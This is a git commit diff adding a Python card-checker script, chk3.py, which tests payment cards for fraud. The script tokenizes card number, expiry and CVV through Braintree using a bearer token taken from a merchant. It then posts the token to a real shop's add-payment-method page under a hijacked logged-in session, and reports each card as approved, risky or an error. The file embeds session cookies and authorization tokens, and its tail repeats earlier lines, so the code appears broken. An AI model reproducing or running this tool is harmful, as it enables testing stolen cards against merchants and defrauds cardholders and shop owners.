ba9280670f7b411b2600e323bcc1ef4f19a6413f
yousef12102008 <moh552vbnm@gmail.com>
2024-07-05 05:06:07 +0300

    Update chk3.py

--- chk3.py
+++ chk3.py
@@ -34,7 +34,7 @@ def chk(card):
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjAxMTI0ODksImp0aSI6Ijg1MjZhOGQ1LWM3MTUtNGYyYi05MjAzLTY3OTc1YWVlN2EzYiIsInN1YiI6IjY1ZjcydHpuZHN3amY0cWYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjY1ZjcydHpuZHN3amY0cWYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.3FV-TEC24C0OXvlwduDyKU_kBj46hlFzF8_3cg-bF_27rbrA8p7ZoYF9QSXNu-TN3quB3Mpunrhhtr3jjRH-AQ',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjAyMjgyNTUsImp0aSI6IjEyM2RhMTVmLWQzYmItNDA1MS1hZTA2LWJjOTVmMWE0ZDY3OSIsInN1YiI6IjR3ZHhuYm4zcm5ueWs2dHEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjR3ZHhuYm4zcm5ueWs2dHEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.sOzt9AQNSNaTWDNGrBd1t3BX31-vbhyaoxDmRxXMkKgP51q8a_efwtRiHtRRvBnW99wjpXzWSm52GEL0OERrOw',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -54,7 +54,7 @@ def chk(card):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '75a663e3-aa94-4931-ab6c-c0be37375ac3',
+        'sessionId': '07858e6f-1092-49f9-b627-35714b145319',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -64,6 +64,105 @@ def chk(card):
                 'expirationMonth': mm,
                 'expirationYear': yy,
                 'cvv': cvc,
+            },
+            'options': {
+                'validate': False,
+            },
+        },
+    },
+    'operationName': 'TokenizeCreditCard',
+}
+
+	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+
+	tok = response.json()['data']['tokenizeCreditCard']['token']
+
+
+
+
+
+
+	cookies = {
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+    'cookielawinfo-checkbox-necessary': 'yes',
+    '_gcl_au': '1.1.850505553.1719526396',
+    '_ga': 'GA1.1.512287116.1719526397',
+    '_fbp': 'fb.1.1719526398376.956231926783586650',
+    'newpass_announce': 'true',
+    'cookielawinfo-checkbox-functional': 'yes',
+    'cookielawinfo-checkbox-performance': 'yes',
+    'cookielawinfo-checkbox-analytics': 'yes',
+    'cookielawinfo-checkbox-advertisement': 'yes',
+    'cookielawinfo-checkbox-others': 'yes',
+    'viewed_cookie_policy': 'yes',
+    'cli_user_preference': 'en-cli-yes-checkbox-necessary-yes-checkbox-functional-yes-checkbox-performance-yes-checkbox-analytics-yes-checkbox-advertisement-yes-checkbox-others-yes',
+    'CookieLawInfoConsent': 'eyJ2ZXIiOiIxIiwibmVjZXNzYXJ5IjoidHJ1ZSIsImZ1bmN0aW9uYWwiOiJ0cnVlIiwicGVyZm9ybWFuY2UiOiJ0cnVlIiwiYW5hbHl0aWNzIjoidHJ1ZSIsImFkdmVydGlzZW1lbnQiOiJ0cnVlIiwib3RoZXJzIjoidHJ1ZSJ9',
+    'wordpress_sec_22d584ae58f64e78cb2ffa7e67fadab7': 'moh5527vbnm%7C1720736110%7CLxjJAIobGmh1V3OdMIi0Q33FlSMDO1FkudFuF9mdbJ3%7C1b04ef2e8118254bfa6124e2ab92c6fdf7a3fd79daa0a408e96f9e9a5435ab47',
+    'wordpress_logged_in_22d584ae58f64e78cb2ffa7e67fadab7': 'moh5527vbnm%7C1720736110%7CLxjJAIobGmh1V3OdMIi0Q33FlSMDO1FkudFuF9mdbJ3%7C15ed1a9e781208626db6146cf4481f89708ed415a45cbca15230eb5155e57376',
+    'pum-1320073': 'true',
+    'br_lgv_stat': 'default%7Cdefault',
+    'sbjs_migrations': '1418474375998%3D1',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+    'sbjs_udata': 'vst%3D8%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+    'sbjs_session': 'pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fce4less.com%2Fmy-account%2Fadd-payment-method%2F',
+    '_ga_JVCGZDD7ML': 'GS1.1.1720141332.8.1.1720141853.4.0.242464406',
+    '_uetsid': '36eb32603a6a11ef8007e91ee6889f69',
+    '_uetvid': '73fa4a3034d211ef9413696097f18d56',
+}
+
+	headers = {
+    'authority': 'ce4less.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'no-cache',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://ce4less.com',
+    'pragma': 'no-cache',
+    'referer': 'https://ce4less.com/my-account/add-payment-method/',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+}
+
+	data = {
+    'payment_method': 'braintree_credit_card',
+    'wc-braintree-credit-card-card-type': 'master-card',
+    'wc-braintree-credit-card-3d-secure-enabled': '',
+    'wc-braintree-credit-card-3d-secure-verified': '',
+    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+    'wc_braintree_credit_card_payment_nonce': tok,
+    'wc_braintree_device_data': '',
+    'wc-braintree-credit-card-tokenize-payment-method': 'true',
+    'woocommerce-add-payment-method-nonce': '7647e55cb3',
+    '_wp_http_referer': '/my-account/add-payment-method/',
+    'woocommerce_add_payment_method': '1',
+}
+
+	response = requests.post('https://ce4less.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
+	text = response.text
+	
+	pattern = r'Status code (.*?)\s*</li>'
+	
+	match = re.search(pattern, text)
+	if match:
+		result = match.group(1)
+		if 'risk_threshold' in text:
+		    result = "RISK: Retry this BIN later."
+	else:
+		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
+			result = "1000: Approved"
+		else:
+			result = "Error"
+			
+	return result
+	
+
             },
             'options': {
                 'validate': False,
